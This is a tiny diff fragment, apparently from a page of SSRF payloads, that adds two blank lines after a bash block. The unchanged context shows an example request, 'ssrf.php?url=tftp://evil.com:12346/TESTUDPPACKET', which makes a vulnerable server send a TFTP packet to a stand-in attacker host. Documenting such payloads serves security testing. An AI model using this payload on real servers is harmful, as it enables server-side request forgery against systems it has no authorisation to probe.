@@ -14,3 +14,5 @@ updated_at: '2023-04-10T20:24:02.883939+00:00'
 ```bash
 ssrf.php?url=tftp://evil.com:12346/TESTUDPPACKET
 ```
+
+
